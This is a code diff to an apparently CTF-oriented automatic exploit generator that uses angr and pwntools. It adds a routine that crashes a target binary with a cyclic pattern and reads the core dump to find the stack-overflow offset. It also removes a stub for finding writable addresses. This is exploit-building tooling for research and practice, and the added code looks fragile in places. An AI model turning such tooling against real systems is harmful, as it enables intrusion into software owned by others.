@@ -10,7 +10,7 @@ from binascii import *
 
 # Disable angr logging and pwntools until we need it 
 logging.getLogger("angr").setLevel(logging.CRITICAL)
-logging.getLogger("angr").setLevel(logging.DEBUG)
+#logging.getLogger("angr").setLevel(logging.DEBUG)
 logging.getLogger("os").setLevel(logging.CRITICAL)
 logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
 
@@ -84,7 +84,7 @@ class rAEG:
     # Determine which exploit we need and return which type as a string
     # Also determine the parameters needed, and the function to execute
     def find_vulnerability(self):
-
+        self.core_smash()
         self.angry_analyze()
 
         if self.has_leak:
@@ -276,9 +276,36 @@ class rAEG:
 
     # Dynamically get the offset
     def core_smash(self):
-
-
-        self.padding = None
+        p = process(self.binary)
+        while p.poll() == None:
+            if p.can_recv(timeout=1):
+                try:
+                    p.recv()
+                except EOFError:
+                    continue
+            else:
+                p.sendline(cyclic(3000,n=8))
+                p.wait()
+                try:
+                    core = p.corefile
+                except:
+                    continue
+                p.close()
+                p.kill()
+                if core == None:
+                    continue
+                os.remove(core.file.name)
+                if(core.stack.data[-8:] != b'\x00'*8):
+                    self.core_smash()
+                    continue
+                padding = cyclic_find(core.read(core.rsp, 8),n=8)
+                if padding == -0x1:
+                    padding = cyclic_find(core.read(core.rbp, 8),n=8)
+                    if padding == -0x1:
+                        continue
+                    else:
+                        padding += 8
+        self.padding = padding
 
 
     def find_goal(self, function_name):
@@ -384,9 +411,6 @@ class rAEG:
         reg2 = min_gadget.split(b"[")[1].split(b",")[1].split(b"]")[0].split(b";")[0].strip()
         return min_gadget, reg1, reg2
 
-    # Find writable address in binary
-    def find_writable_address(self):
-        return None
 
     # Write string to writable address in the binary
     # !TODO Change to be able to write different strings
